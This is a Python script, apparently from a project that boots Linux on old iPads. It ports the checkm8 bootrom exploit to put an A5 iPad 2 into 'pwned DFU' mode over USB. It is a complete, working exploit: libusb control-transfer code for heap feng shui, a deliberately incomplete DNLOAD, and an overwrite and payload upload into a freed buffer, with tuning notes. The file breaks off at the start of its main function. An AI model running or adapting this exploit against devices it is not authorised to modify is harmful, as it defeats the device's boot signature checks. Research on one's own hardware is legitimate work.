#!/usr/bin/env python3
"""
checkm8-a5-pwn.py — put an A5 iPad 2 (S5L8940X, CPID 0x8940, SecureROM
iBoot-838.3) into "pwned DFU" with the checkm8 bootrom USB exploit.

This is a self-contained Python 3 host port of the A5 sequence from
a1exdandy/checkm8-a5 (Arduino/MAX3421E), using the prebuilt S5L8940X payload
from that project.  It talks to libusb-1.0 directly through ctypes, so it
does not depend on pyusb and works with this host's older libusb (no
libusb_get_string_descriptor_simple).

checkm8 runs against SecureROM DFU mode only.  It needs no jailbreak, no
sideloading, no Apple ID, and it does not modify the NAND.  After it
succeeds the DFU serial number contains "PWND:[checkm8]" and unsigned
images can be uploaded, which is what boot/boot-linux.sh --skip-pwn uses to
boot Linux from RAM.

Usage:
    python3 tools/checkm8-a5-pwn.py --selftest
    python3 tools/checkm8-a5-pwn.py                 # pwn the DFU device
    python3 tools/checkm8-a5-pwn.py --wait --debug  # wait for DFU, then pwn
    python3 tools/checkm8-a5-pwn.py --feng-shui-mode setup-only --leak 626

Host adaptation: a PC USB stack sends DATA1 after SETUP, so the Arduino's
0xcc "pre-packets" are toggle dummies and are intentionally not sent here.

Exploit notes (from the decompiled A5 SecureROM USB stack, see
build/src/checkm8-a5/README.md): every OUT data packet is memmove'd into a
global io_buffer at a running offset, regardless of which control transfer
it belongs to, and the globals survive a USB bus reset.  A bus reset makes
the DFU parse the io_buffer as an image; when parsing fails the DFU re-enters
DFU mode and FREES the io_buffer but skips resetting the globals — leaving
a stale (buffer, rcvd, length) triple.  A status-phase ZLP is processed like
a zero-length data packet and fires end_of_transfer, which resets the globals,
so no transfer whose globals must persist may ever complete (no status
phase).  Consequences for this host port:

  - stage 1 feng shui requests: SETUP + one IN data transaction, abandoned
    (a completed transfer frees the response buffer = no leak, and its
    status ZLP would reset state).  --feng-shui-mode in-cancel (default)
    matches the Arduino; setup-only cancels before the data phase.
  - stage 2 incomplete DNLOAD: cancel once exactly 0x6C0 of 0x700 bytes are
    on the wire (--cancel-at).  Sending all 0x700 fires end_of_transfer and
    resets the globals — the exploit dies silently in stage 3.
  - stage 3 critical IN: abandoned before its status ZLP (same reason).
  - the overwrite/payload OUT writes complete the data stage on purpose
    (end_of_transfer -> the DFU copies the io_buffer), so their status
    phase is harmless; --write-mode complete is the default.

Exit status: 0 = device reports 'PWND:[checkm8]' (already pwned counts),
1 = fail.  If the exploit misses, re-enter DFU on the iPad (Power+Home) and
try again; tune --leak / --leak-delay-ms / --feng-shui-mode / --cancel-at /
--out-spin-us from the --debug output.
"""

import argparse
import ctypes
import hashlib
import os
import struct
import sys
import time
from ctypes import (POINTER, Structure, byref, c_int, c_long, c_uint8,
                    c_uint16, c_uint32, c_void_p, create_string_buffer)

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
BIN_DIR = os.path.join(ROOT, 'build', 'ipwndfu', 'bin')

VENDOR_APPLE = 0x05AC
PRODUCT_DFU = 0x1227
CPID_A5 = 0x8940
SRTG_A5 = 'SRTG:[iBoot-838.3]'
PWN_MARKER = 'PWND:[checkm8]'

# a1exdandy/checkm8-a5, A5_8940 block
A5_PADDING = 0x6C0
A5_LEAK_COUNT = 620
A5_PAYLOAD_LEN = 0x2C0
A5_OVERWRITE_LEN = 0x40

PAYLOAD_FILES = {
    'classic': ('checkm8_s5l8940x.bin', 704,
                '63ddb4f248a4f013693e89ed2115e6fd2d8bbb2e'),
    'luke': ('checkm8_s5l8940x_luke.bin', 640,
             '9d288689145543552a040dd6c81be065443447e7'),
}
OVERWRITE_FILE = ('overwrite_s5l8940x.bin', 64,
                  'b9fe715ae37285dd346c44af38fc7e168ea35d47')

# USB constants used by the exploit
REQ_GET_DESCRIPTOR = 6
REQ_DNLOAD = 1
REQ_DFU_GETSTATUS = 3
STRING_DESCRIPTOR = 3
LANG_EN_US = 0x0409
# wIndex used by ALL of the Arduino's heap_feng_shui_req calls (the feng shui
# leaks, the "no leak" request and the stage-3 critical IN).  The Habr/A5
# notes say the value is irrelevant to the device; reproduce the Arduino's.
HABR_LANG = 0x040A

# libusb transfer status values (libusb_transfer_status)
STATUS_NAMES = {
    -1: 'PENDING', 0: 'COMPLETED', 1: 'ERROR', 2: 'TIMED_OUT',
    3: 'CANCELLED', 4: 'STALL', 5: 'NO_DEVICE', 6: 'OVERFLOW',
}
LIBUSB_TRANSFER_TYPE_CONTROL = 0
LIBUSB_TRANSFER_FREE_BUFFER = 1 << 1


def sha1(data):
    return hashlib.sha1(data).hexdigest()


def load_checked(name, size, digest):
    path = os.path.join(BIN_DIR, name)
    with open(path, 'rb') as f:
        data = f.read()
    if len(data) != size:
        raise SystemExit('error: %s is %d bytes, expected %d' % (path, len(data), size))
    if sha1(data) != digest:
        raise SystemExit('error: %s sha1 %s, expected %s' % (path, sha1(data), digest))
    return data


def load_payloads(variant):
    payload_name, payload_size, payload_sha = PAYLOAD_FILES[variant]
    payload = load_checked(payload_name, payload_size, payload_sha)
    overwrite = load_checked(*OVERWRITE_FILE)
    return payload, overwrite


class DeviceDescriptor(Structure):
    _fields_ = [
        ('bLength', c_uint8), ('bDescriptorType', c_uint8), ('bcdUSB', c_uint16),
        ('bDeviceClass', c_uint8), ('bDeviceSubClass', c_uint8),
        ('bDeviceProtocol', c_uint8), ('bMaxPacketSize0', c_uint8),
        ('idVendor', c_uint16), ('idProduct', c_uint16), ('bcdDevice', c_uint16),
        ('iManufacturer', c_uint8), ('iProduct', c_uint8),
        ('iSerialNumber', c_uint8), ('bNumConfigurations', c_uint8),
    ]


class Transfer(Structure):
    _fields_ = [
        ('dev_handle', c_void_p),
        ('flags', c_uint8),
        ('endpoint', c_uint8),
        ('type', c_uint8),
        ('timeout', c_uint32),
        ('status', c_int),
        ('length', c_int),
        ('actual_length', c_int),
        ('callback', c_void_p),
        ('user_data', c_void_p),
        ('buffer', c_void_p),
        ('num_iso_packets', c_int),
    ]


class Timeval(Structure):
    _fields_ = [('tv_sec', c_long), ('tv_usec', c_long)]


class LibUSB:
    CANDIDATES = ['libusb-1.0.so.0', 'libusb-1.0.so', 'libusb-1.0.so.0.8.6',
                  'libusb-1.0.0.dylib', 'libusb-1.0.dylib']

    def __init__(self):
        self.lib = None
        for name in self.CANDIDATES:
            try:
                self.lib = ctypes.CDLL(name)
                break
            except OSError:
                continue
        if self.lib is None:
            raise SystemExit('error: libusb-1.0 not found (install libusb-1.0-0)')
        L = self.lib
        L.libusb_init.argtypes = [POINTER(c_void_p)]
        L.libusb_init.restype = c_int
        L.libusb_exit.argtypes = [c_void_p]
        L.libusb_get_device_list.argtypes = [c_void_p, POINTER(POINTER(c_void_p))]
        L.libusb_get_device_list.restype = ctypes.c_ssize_t
        L.libusb_free_device_list.argtypes = [POINTER(c_void_p), c_int]
        L.libusb_get_device_descriptor.argtypes = [c_void_p, POINTER(DeviceDescriptor)]
        L.libusb_get_device_descriptor.restype = c_int
        L.libusb_get_bus_number.argtypes = [c_void_p]
        L.libusb_get_bus_number.restype = c_uint8
        L.libusb_get_device_address.argtypes = [c_void_p]
        L.libusb_get_device_address.restype = c_uint8
        L.libusb_open.argtypes = [c_void_p, POINTER(c_void_p)]
        L.libusb_open.restype = c_int
        L.libusb_close.argtypes = [c_void_p]
        L.libusb_claim_interface.argtypes = [c_void_p, c_int]
        L.libusb_claim_interface.restype = c_int
        L.libusb_release_interface.argtypes = [c_void_p, c_int]
        L.libusb_release_interface.restype = c_int
        L.libusb_kernel_driver_active.argtypes = [c_void_p, c_int]
        L.libusb_kernel_driver_active.restype = c_int
        L.libusb_detach_kernel_driver.argtypes = [c_void_p, c_int]
        L.libusb_detach_kernel_driver.restype = c_int
        L.libusb_attach_kernel_driver.argtypes = [c_void_p, c_int]
        L.libusb_attach_kernel_driver.restype = c_int
        L.libusb_reset_device.argtypes = [c_void_p]
        L.libusb_reset_device.restype = c_int
        L.libusb_control_transfer.argtypes = [c_void_p, c_uint8, c_uint8, c_uint16,
                                               c_uint16, c_void_p, c_uint16, c_uint32]
        L.libusb_control_transfer.restype = c_int
        L.libusb_alloc_transfer.argtypes = [c_int]
        L.libusb_alloc_transfer.restype = POINTER(Transfer)
        L.libusb_submit_transfer.argtypes = [POINTER(Transfer)]
        L.libusb_submit_transfer.restype = c_int
        L.libusb_cancel_transfer.argtypes = [POINTER(Transfer)]
        L.libusb_cancel_transfer.restype = c_int
        L.libusb_free_transfer.argtypes = [POINTER(Transfer)]
        L.libusb_handle_events_timeout.argtypes = [c_void_p, POINTER(Timeval)]
        L.libusb_handle_events_timeout.restype = c_int
        self.ctx = c_void_p()
        rc = L.libusb_init(byref(self.ctx))
        if rc != 0:
            raise SystemExit('error: libusb_init failed (%d)' % rc)
        libc = ctypes.CDLL(None)
        self._malloc = libc.malloc
        self._malloc.argtypes = [ctypes.c_size_t]
        self._malloc.restype = c_void_p
        self._free = libc.free
        self._free.argtypes = [c_void_p]

    def close(self):
        if self.ctx:
            self.lib.libusb_exit(self.ctx)
            self.ctx = c_void_p()

    def find_dfu(self, timeout=5.0):
        """Return (dev, handle) for the first Apple DFU device, else (None, None)."""
        L = self.lib
        start = time.time()
        while True:
            devs = POINTER(c_void_p)()
            n = L.libusb_get_device_list(self.ctx, byref(devs))
            found = None
            for i in range(n):
                dev = devs[i]
                desc = DeviceDescriptor()
                if L.libusb_get_device_descriptor(dev, byref(desc)) != 0:
                    continue
                if desc.idVendor == VENDOR_APPLE and desc.idProduct == PRODUCT_DFU:
                    found = dev
                    break
            L.libusb_free_device_list(devs, 1)
            if found is not None:
                handle = c_void_p()
                rc = L.libusb_open(found, byref(handle))
                if rc != 0:
                    raise SystemExit(
                        'error: libusb_open failed (%d) — permission? Install the\n'
                        'udev rule from boot/boot-linux.sh, or run with SUDO=sudo.' % rc)
                return found, handle
            if time.time() - start > timeout:
                return None, None
            time.sleep(0.01)

    @staticmethod
    def describe(dev):
        L = LibUSB._current.lib
        return 'bus %d address %d' % (L.libusb_get_bus_number(dev),
                                       L.libusb_get_device_address(dev))

    def claim(self, handle):
        L = self.lib
        if L.libusb_kernel_driver_active(handle, 0) == 1:
            L.libusb_detach_kernel_driver(handle, 0)
        rc = L.libusb_claim_interface(handle, 0)
        return rc

    def release(self, handle):
        if not handle:
            return
        try:
            self.lib.libusb_release_interface(handle, 0)
        except Exception:
            pass
        self.lib.libusb_close(handle)

    def reset(self, handle):
        try:
            return self.lib.libusb_reset_device(handle)
        except Exception:
            return -1

    def ctrl(self, handle, bmRequestType, bRequest, wValue, wIndex, data, timeout):
        """Synchronous control transfer.  data=None means a zero-length data stage."""
        L = self.lib
        if data is None:
            buf, length = None, 0
        else:
            buf = create_string_buffer(bytes(data), max(len(data), 1))
            length = len(data)
        return L.libusb_control_transfer(handle, bmRequestType, bRequest, wValue,
                                         wIndex, buf, length, timeout)

    def ctrl_in(self, handle, bmRequestType, bRequest, wValue, wIndex, length, timeout):
        L = self.lib
        buf = create_string_buffer(length)
        rc = L.libusb_control_transfer(handle, bmRequestType, bRequest, wValue,
                                       wIndex, buf, length, timeout)
        return rc, buf.raw[:max(rc, 0)] if rc > 0 else b''

    def serial(self, handle, desc_index):
        """Raw GET_DESCRIPTOR(string) + UTF-16LE decode.

        The old libusb on this host lacks libusb_get_string_descriptor_simple,
        so read the descriptor with a normal control-IN transfer instead.
        """
        rc, raw = self.ctrl_in(handle, 0x80, REQ_GET_DESCRIPTOR,
                               (STRING_DESCRIPTOR << 8) | desc_index,
                               LANG_EN_US, 255, 1000)
        if rc > 4 and raw[0] == rc and raw[1] == STRING_DESCRIPTOR:
            return raw[2:rc].decode('utf-16-le', 'replace')
        return ''

    def _wait_transfer(self, transfer, timeout_ms):
        L = self.lib
        t = transfer.contents
        deadline = time.time() + timeout_ms / 1000.0
        while t.status == -1 and time.time() < deadline:
            remaining_ms = max(0.0, (deadline - time.time()) * 1000.0)
            tv = Timeval(0, int(min(100000, remaining_ms * 1000)))
            rc = L.libusb_handle_events_timeout(self.ctx, byref(tv))
            if rc != 0 and rc != -1:
                break
        return t.status, t.actual_length

    def raw_ctrl(self, handle, bmRequestType, bRequest, wValue, wIndex, wLength,
                 data=b'', abandon=False, timeout_ms=1000, name='raw',
                 cancel_at=0, abandon_timeout_ms=3000.0, trace=None):
        """Raw control transfer with an explicit wLength.

        For OUT transfers the data-stage length is len(data), which may differ
        from wLength — the A5 sequence needs both wLength=0x40/data=0x80 and
        wLength=0x2C0/data=0x300.  For IN transfers the buffer is padded to
        wLength.  When abandon=True the in-flight URB is cancelled at the
        first of: natural completion (STALL/error/...), cancel_at bytes
        actually transferred, or abandon_timeout_ms.  This is what leaves a
        control transfer without its status phase — a status-phase ZLP would
        be processed by the A5 as a zero-length data packet and reset the
        global USB state (see the module docstring).
        """
        L = self.lib
        if data is None:
            data = b''
        data = bytes(data)
        if (bmRequestType & 0x80) and len(data) < wLength:
            data = data + b'\0' * (wLength - len(data))
        packet = struct.pack('<BBHHH', bmRequestType, bRequest, wValue, wIndex, wLength) + data
        buf = self._malloc(len(packet))
        if not buf:
            raise SystemExit('error: malloc(%d) failed' % len(packet))
        ctypes.memmove(buf, packet, len(packet))
        transfer = L.libusb_alloc_transfer(0)
        if not transfer:
            self._free(buf)
            raise SystemExit('error: libusb_alloc_transfer failed')
        t = transfer.contents
        t.dev_handle = handle
        t.flags = LIBUSB_TRANSFER_FREE_BUFFER
        t.endpoint = 0
        t.type = LIBUSB_TRANSFER_TYPE_CONTROL
        t.timeout = 0
        t.status = -1
        t.length = len(packet)
        t.actual_length = 0
        t.callback = None
        t.user_data = None
        t.buffer = buf
        t.num_iso_packets = 0
        rc = L.libusb_submit_transfer(transfer)
        if rc != 0:
            # LIBUSB_TRANSFER_FREE_BUFFER is set, so libusb_free_transfer frees
            # buf as well; freeing it here would be a double free.
            L.libusb_free_transfer(transfer)
            return rc, None
        if abandon:
            deadline = time.perf_counter() + abandon_timeout_ms / 1000.0
            t0 = time.perf_counter()
            cancel_rc = -5  # LIBUSB_ERROR_NOT_FOUND (already completed)
            while True:
                status = t.status
                actual = t.actual_length
                if status != -1:
                    break  # completed on its own (STALL, error, ...)
                if cancel_at and actual >= cancel_at:
                    cancel_rc = L.libusb_cancel_transfer(transfer)
                    break
                if time.perf_counter() >= deadline:
                    cancel_rc = L.libusb_cancel_transfer(transfer)
                    break
            status, actual = self._wait_transfer(transfer, 500)
            if status == -1:
                raise SystemExit('error: %s did not complete after cancel' % name)
            if trace is not None:
                trace.append((name, (time.perf_counter() - t0) * 1e6,
                              actual, status))
            info = (status, actual, cancel_rc)
            L.libusb_free_transfer(transfer)
            return 0, info
        status, actual = self._wait_transfer(transfer, timeout_ms)
        if status == -1:
            raise SystemExit('error: %s timed out before completion' % name)
        info = (status, actual, 0)
        L.libusb_free_transfer(transfer)
        return 0, info


LibUSB._current = None

SYSFS_USB = '/sys/bus/usb/devices'


def sysfs_dfu(timeout=0.0, poll=0.005):
    """Find the Apple DFU device (05ac:1227) via sysfs — WITHOUT opening it.

    Polling sysfs performs no USB traffic at all (no descriptor or string
    control transfers), so it can watch for a freshly-entered DFU and hand
    over the instant the device appears.  Returns (syspath, serial) where
    serial is the kernel-cached DFU serial string ('' if the kernel did not
    read it).  (None, '') on timeout.
    """
    start = time.time()
    while True:
        try:
            names = os.listdir(SYSFS_USB)
        except OSError:
            names = []
        for name in names:
            path = os.path.join(SYSFS_USB, name)
            try:
                with open(os.path.join(path, 'idVendor')) as f:
                    vid = f.read().strip()
                with open(os.path.join(path, 'idProduct')) as f:
                    pid = f.read().strip()
            except OSError:
                continue
            if vid == '05ac' and pid == '1227':
                serial = ''
                try:
                    with open(os.path.join(path, 'serial')) as f:
                        serial = f.read().strip()
                except OSError:
                    pass
                return path, serial
        if time.time() - start >= timeout:
            return None, ''
        time.sleep(poll)


def acquire(usb, want_serial=False, timeout=15.0):
    """Find, open, claim and (optionally) read the DFU serial number."""
    start = time.time()
    last_rc = None
    while time.time() - start < timeout:
        dev, handle = usb.find_dfu(timeout=0.2)
        if handle is None:
            time.sleep(0.05)
            continue
        rc = usb.claim(handle)
        if rc != 0:
            last_rc = rc
            usb.release(handle)
            time.sleep(0.05)
            continue
        desc = DeviceDescriptor()
        usb.lib.libusb_get_device_descriptor(dev, byref(desc))
        serial = usb.serial(handle, desc.iSerialNumber) if want_serial else ''
        return dev, handle, desc, serial
    raise SystemExit('error: could not claim the DFU device (last rc=%s) —\n'
                     'permission? install the udev rule from boot/boot-linux.sh' % last_rc)


def reset_and_release(usb, handle, settle=1.0):
    usb.reset(handle)
    usb.release(handle)
    if settle:
        time.sleep(settle)


def status_name(status):
    return STATUS_NAMES.get(status, str(status))


def debug_raw(name, rc, info):
    if info is None:
        print('    [debug] %-18s submit rc=%d' % (name, rc))
        return
    status, actual, cancel_rc = info
    print('    [debug] %-18s status=%s actual=%d cancel_rc=%d'
          % (name, status_name(status), actual, cancel_rc))


def auto_out_spin(spin_us, data_len):
    """Full-speed estimate for sending full OUT packets before cancellation.

    The A5 sequence only needs the data stage here; the device either is still
    waiting for more data (so it NAKs the status phase) or has already ended
    the transfer on the final full packet.  This estimate errs on the side of
    sending the whole data stage; --out-spin-us overrides it.
    """
    packets = max(1, (data_len + 63) // 64)
    return max(spin_us, 120 + packets * 185)


def heap_feng_shui_req(usb, handle, serial_idx, sz, mode, spin_us, debug=False):
    """One heap feng shui request (a1exdandy heap_feng_shui_req).

    The Arduino sends SETUP(GET_DESCRIPTOR string, wIndex 0x040A, wLength=sz)
    plus ONE IN data transaction, then abandons the transfer with no status
    phase — a completed transfer frees the response buffer (no leak), and a
    status-phase ZLP would be processed as a zero-length data packet and
    reset the A5 global USB state.  mode 'in-cancel' (default) reproduces
    that: the IN transaction happens and the URB is cancelled as soon as the
    first data packet arrives (or the device STALLs, which also ends the
    transfer without a status phase).  mode 'setup-only' cancels the URB
    before the data phase, like the earlier host port.
    """
    if mode == 'in-cancel':
        rc, info = usb.raw_ctrl(handle, 0x80, REQ_GET_DESCRIPTOR,
                                (STRING_DESCRIPTOR << 8) | serial_idx, HABR_LANG,
                                sz, b'', abandon=True, cancel_at=0x40,
                                abandon_timeout_ms=1.5, timeout_ms=500,
                                name='feng shui %#x' % sz)
    else:
        rc, info = usb.raw_ctrl(handle, 0x80, REQ_GET_DESCRIPTOR,
                                (STRING_DESCRIPTOR << 8) | serial_idx, HABR_LANG,
                                sz, b'', abandon=True, cancel_at=0,
                                abandon_timeout_ms=max(spin_us, 1) / 1000.0,
                                timeout_ms=500, name='feng shui %#x' % sz)
    if debug:
        debug_raw('feng shui %#x' % sz, rc, info)
    return rc == 0


def stage0(usb, init_resets):
    print('== stage 0: %d USB bus reset(s) ==' % init_resets)
    for i in range(init_resets):
        dev, handle, desc, _ = acquire(usb, want_serial=False)
        print('  reset %d/%d (%s)' % (i + 1, init_resets, usb.describe(dev)))
        reset_and_release(usb, handle, settle=0.5)


def stage1(usb, serial_idx, leak_count, mode, spin_us, leak_delay_ms, debug):
    print('== stage 1: heap feng shui (%d leak requests, mode %s) ==' % (leak_count, mode))
    dev, handle, desc, _ = acquire(usb, want_serial=False)
    usb.ctrl(handle, 0x02, 3, 0, 0x80, None, 10)  # stall (expected to error)
    success = 0
    attempts = 0
    max_attempts = leak_count + 200
    while success < leak_count:
        attempts += 1
        if attempts > max_attempts:
            usb.release(handle)
            raise SystemExit('error: only %d/%d leak requests were accepted' % (success, leak_count))
        req_debug = debug and (attempts <= 3 or attempts % 100 == 0)
        if heap_feng_shui_req(usb, handle, serial_idx, 0x80, mode, spin_us, req_debug):
            success += 1
        # The Arduino prints a serial line per request; that pacing matters.
        if leak_delay_ms:
            time.sleep(leak_delay_ms / 1000.0)
        if attempts % 100 == 0:
            print('  %d/%d' % (success, leak_count))
    heap_feng_shui_req(usb, handle, serial_idx, 0x81, mode, spin_us, debug)  # no leak
    if leak_delay_ms:
        time.sleep(leak_delay_ms / 1000.0)
    print('  feng shui done (%d attempts)' % attempts)
    reset_and_release(usb, handle, settle=1.0)


def stage2(usb, spin_us, cancel_at, out_spin_us, debug):
    print('== stage 2: set global state / re-enter DFU ==')
    dev, handle, desc, _ = acquire(usb, want_serial=False)
    # (d) SETUP(DNLOAD, wLength=0x40) + OUT(0x80) + INHS status.  wLength and
    # the data-stage length are intentionally different.
    rc, info = usb.raw_ctrl(handle, 0x21, REQ_DNLOAD, 0, 0, 0x40,
                            b'\xcc' * 0x80, abandon=False, timeout_ms=1000,
                            name='set-state OUT')
    if debug:
        debug_raw('set-state OUT', rc, info)
    if rc != 0:
        usb.release(handle)
        raise SystemExit('error: set-state OUT submit failed (%d)' % rc)
    if info and info[0] != 0:
        print('  warning: set-state OUT status=%s (continuing)' % status_name(info[0]))
    # (e) zero-length DNLOAD
    rc = usb.ctrl(handle, 0x21, REQ_DNLOAD, 0, 0, None, 10)
    if debug:
        print('    [debug] zero DNLOAD       ctrl rc=%d' % rc)
    # (f) two DFU GETSTATUS requests
    for i in range(2):
        rc, raw = usb.ctrl_in(handle, 0xA1, REQ_DFU_GETSTATUS, 0, 0, 6, 1000)
        if debug:
            print('    [debug] GETSTATUS %d        ctrl_in rc=%d raw=%s' % (i + 1, rc, raw.hex()))
    # (g) incomplete DNLOAD.  The Arduino sends padding+0x40 OUT packets, but
    # its first OUT is a data-toggle dummy, so the device only receives
    # `padding` bytes while its expected length stays padding+0x40.  A PC host
    # sends DATA1 first and usbfs refuses an OUT URB whose data stage is
    # shorter than wLength, so submit the full wLength and cancel once exactly
    # `cancel_at` bytes are on the wire (the final 0x40 packet never goes out).
    # The device must end up with ep0_data_phase_rcvd = 0x6C0 of 0x700 — if it
    # receives all 0x700 it fires end_of_transfer and resets the globals, and
    # stage 3 silently writes into a dead pointer.
    w_length = A5_PADDING + 0x40
    data = b'\0' * w_length
    if cancel_at:
        deadline_ms = out_spin_us / 1000.0 if out_spin_us else 3000.0
    else:
        # time-based fallback (old behaviour): estimate the data-stage time
        deadline_ms = (out_spin_us or max(1, auto_out_spin(spin_us, A5_PADDING) - 185)) / 1000.0
    rc, info = usb.raw_ctrl(handle, 0x21, REQ_DNLOAD, 0, 0, w_length,
                            data, abandon=True, cancel_at=cancel_at,
                            abandon_timeout_ms=deadline_ms, timeout_ms=1000,
                            name='incomplete DNLOAD')
    if debug:
        debug_raw('incomplete DNLOAD', rc, info)
    if rc != 0:
        usb.release(handle)
        raise SystemExit('error: incomplete DNLOAD submit failed (%d)' % rc)
    if info and info[1] >= w_length:
        print('  warning: incomplete DNLOAD transferred %#x of %#x — the device '
              'reached end_of_transfer; lower --out-spin-us or check that '
              'actual_length is reported incrementally' % (info[1], w_length))
    reset_and_release(usb, handle, settle=0.5)


def stage3(usb, serial_idx, payload, overwrite, out_spin_us, write_mode, debug):
    print('== stage 3: heap occupation (overwrite + payload) ==')
    dev, handle, desc, _ = acquire(usb, want_serial=False)
    # (h) one abandoned IN request ("no leak"), same shape as the Arduino's
    # heap_feng_shui_req(0x81): SETUP + one IN data transaction, no status
    # phase.  This must NOT complete — its status-phase ZLP would be
    # processed as a zero-length data packet, fire end_of_transfer and reset
    # the global USB state the overwrite/payload depend on.
    rc, info = usb.raw_ctrl(handle, 0x80, REQ_GET_DESCRIPTOR,
                            (STRING_DESCRIPTOR << 8) | serial_idx, HABR_LANG,
                            0x81, b'', abandon=True, cancel_at=0x40,
                            abandon_timeout_ms=1.5, timeout_ms=500,
                            name='critical IN')
    if debug:
        debug_raw('critical IN', rc, info)
    if rc != 0:
        usb.release(handle)
        raise SystemExit('error: critical IN submit failed (%d)' % rc)
    if info and info[0] == 0:
        usb.release(handle)
        raise SystemExit('error: critical IN completed — its status ZLP reset the '
                         'global USB state; the exploit cannot continue')
    # (i)/(j) The Arduino sends a 0x40 0xcc "pre-packet" before the overwrite
    # and payload.  That pre-packet exists to flip the MAX3421E data toggle; a
    # PC host already sends DATA1 after SETUP, so the host adaptation sends the
    # overwrite/payload directly.  Sending the pre-packet from a PC would shift
    # the payload by 0x40 and break the payload's absolute addresses.
    if write_mode == 'complete':
        # Default host path: complete control transfers.  Errors are expected
        # (the first request is an invalid OUT GET_STATUS); what matters is
        # that the data stage is written into the dangling io_buffer.  The
        # status phase is harmless here: the data stage already fired
        # end_of_transfer and reset the globals.
        rc = usb.ctrl(handle, 0x00, 0x00, 0, 0, overwrite, 100)
        if debug:
            print('    [debug] overwrite OUT      ctrl rc=%d' % rc)
        rc = usb.ctrl(handle, 0x21, REQ_DNLOAD, 0, 0, payload, 1000)
        if debug:
            print('    [debug] payload OUT        ctrl rc=%d' % rc)
    else:
        # Raw Arduino style: abandoned OUT transfers with no status phase,
        # cancelled once the whole data stage is on the wire.
        deadline_ms = out_spin_us / 1000.0 if out_spin_us else 1000.0
        rc, info = usb.raw_ctrl(handle, 0x00, 0x00, 0, 0, len(overwrite),
                                overwrite, abandon=True, cancel_at=len(overwrite),
                                abandon_timeout_ms=deadline_ms, timeout_ms=1000,
                                name='overwrite OUT')
        if debug:
            debug_raw('overwrite OUT', rc, info)
        if rc != 0:
            usb.release(handle)
            raise SystemExit('error: overwrite OUT submit failed (%d)' % rc)
        rc, info = usb.raw_ctrl(handle, 0x21, REQ_DNLOAD, 0, 0, len(payload),
                                payload, abandon=True, cancel_at=len(payload),
                                abandon_timeout_ms=deadline_ms, timeout_ms=1000,
                                name='payload OUT')
        if debug:
            debug_raw('payload OUT', rc, info)
        if rc != 0:
            usb.release(handle)
            raise SystemExit('error: payload OUT submit failed (%d)' % rc)
    reset_and_release(usb, handle, settle=0.5)


def verify(usb):
    print('== verify ==')
    try:
        dev, handle, desc, serial = acquire(usb, want_serial=True)
    except SystemExit:
        raise SystemExit('error: no DFU device after the final reset — the exploit\n'
                         'did not complete. Re-enter DFU on the iPad (Power+Home)\n'
                         'and try again.')
    print('Found:', serial.strip())
    usb.release(handle)
    return serial


def exploit(args):
    usb = LibUSB()
    LibUSB._current = usb
    payload, overwrite = load_payloads(args.payload)
    print('*** checkm8 A5 host port (S5L8940X, CPID 0x8940, iBoot-838.3) ***')
    print('payload: %s (%d bytes, sha1 %s)' % (args.payload, len(payload), sha1(payload)))
    print('overwrite: %d bytes, sha1 %s' % (len(overwrite), sha1(overwrite)))
    start = time.time()

    # Prefer the kernel-cached sysfs serial: reading it costs zero USB
    # traffic, and any control transfer we send before the exploit starts
    # shifts the heap the feng shui is tuned against.
    sys_serial = ''
    if args.wait:
        print('== waiting for the iPad to enter DFU (sysfs poll, no USB traffic) ==')
        print('   put the iPad in DFU now: hold Power+Home ~10s until the screen')
        print('   goes black, release Power, keep holding Home')
        syspath, sys_serial = sysfs_dfu(timeout=args.wait_timeout)
        if syspath is None:
            raise SystemExit('error: no DFU device appeared within %0.0fs' % args.wait_timeout)
        print('DFU device appeared:', syspath)
        if sys_serial:
            print('sysfs serial:', sys_serial)
    else:
        _, sys_serial = sysfs_dfu(timeout=1.0)

    dev, handle, desc, serial = acquire(usb, want_serial=not sys_serial)
    if not sys_serial:
        print('Found:', serial.strip() or '(serial unreadable before resets)')
    print('USB:', usb.describe(dev), 'iSerialNumber index:', desc.iSerialNumber)
    if PWN_MARKER in (serial or sys_serial):
        print('Device is already in pwned DFU mode. Nothing to do.')
        usb.release(handle)
        return 0
    if desc.iSerialNumber == 0 or desc.iSerialNumber == 0xFF:
        usb.release(handle)
        raise SystemExit('error: invalid iSerialNumber index %d' % desc.iSerialNumber)
    serial_idx = desc.iSerialNumber
    usb.release(handle)

    if args.stage in ('all', '0'):
        stage0(usb, args.init_resets)
        # A wedged DFU often cannot answer a serial read until after the stage-0
        # resets.  Re-read and validate CPID/SRTG before continuing.
        dev, handle, desc, serial = acquire(usb, want_serial=True)
        print('After resets:', serial.strip())
        usb.release(handle)
    serial = serial or sys_serial
    if 'CPID:%04X' % CPID_A5 not in serial:
        raise SystemExit('error: not an A5 device (expected CPID 8940). Serial: %s' % serial.strip())
    if SRTG_A5 not in serial:
        raise SystemExit('error: CPID is A5 but the serial lacks %s.\n'
                         'The device is not in SecureROM DFU mode (it is in LLB/iBSS\n'
                         'DFU mode). Re-enter DFU from a powered-off state.' % SRTG_A5)
    serial_idx = desc.iSerialNumber

    if args.stage in ('all', '1'):
        stage1(usb, serial_idx, args.leak, args.feng_shui_mode, args.spin_us,
               args.leak_delay_ms, args.debug)
    if args.stage in ('all', '2'):
        stage2(usb, args.spin_us, args.cancel_at, args.out_spin_us, args.debug)
    if args.stage in ('all', '3'):
        stage3(usb, serial_idx, payload, overwrite,
               args.out_spin_us, args.write_mode, args.debug)
    serial = verify(usb)
    if PWN_MARKER not in serial:
        raise SystemExit('error: exploit failed — device did not enter pwned DFU mode.\n'
                         'Re-enter DFU (Power+Home) and try again. With --debug, check\n'
                         'that the incomplete DNLOAD is CANCELLED at actual=0x6C0 (not\n'
                         '0x700), that the critical IN is CANCELLED/STALL (not COMPLETED),\n'
                         'and that stage 2 survived its reset (set-state OUT completes,\n'
                         'GETSTATUS returns 6 bytes).')
    print('Device is now in pwned DFU mode.')
    print('(%0.2f seconds)' % (time.time() - start))
    print('Next: ./boot/boot-linux.sh --skip-pwn')
    return 0


def selftest(args):
    for variant in PAYLOAD_FILES:
        payload, overwrite = load_payloads(variant)
        print('%s payload:   %d bytes, sha1 %s' % (variant, len(payload), sha1(payload)))
        print('%s overwrite: %d bytes, sha1 %s' % (variant, len(overwrite), sha1(overwrite)))
    payload, _ = load_payloads(args.payload)
    if len(payload) != A5_PAYLOAD_LEN:
        raise SystemExit('error: selected payload is not the A5 0x2C0 payload')
    print('A5 constants: padding=%#x leak=%d payload=%#x overwrite=%#x'
          % (A5_PADDING, A5_LEAK_COUNT, A5_PAYLOAD_LEN, A5_OVERWRITE_LEN))
    print('selftest OK')
    return 0


def main():
